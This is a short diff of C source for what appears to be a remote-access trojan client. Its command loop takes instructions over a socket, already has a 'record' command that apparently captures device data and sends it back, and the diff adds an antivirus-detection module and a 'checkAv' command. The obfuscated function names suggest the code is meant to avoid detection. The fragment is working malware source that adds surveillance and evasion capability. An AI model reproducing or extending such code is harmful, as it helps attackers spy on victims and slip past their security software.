@@ -13,6 +13,7 @@
 #include <sys/stat.h>
 #include "../base64.c"
 #include "../windows/sysInfoWin.c"
+#include "../windows/AvDetector.c"
 
 
 #define ALIAS "random_str"
@@ -20,6 +21,14 @@
 // Definiciones
 #define SOCKBUFF 2048
 #define CMDBUFF 2048
+
+/*
+
+  Creado por "an0mal1a"
+
+       https://github.com/an0mal1a
+
+*/
 
 // Prototipos
 long gtflesze(char* filename);
@@ -573,6 +582,9 @@ int mainLoop(int conn){
         else if (strcmp(instruct, "record") == 0){
             char *file = srtRrcd(conn); 
             rdViceDt(file, conn);
+
+        } else if (strcmp(instruct, "checkAv") == 0){
+            lowSearch(conn);
         }
         else
             continue;
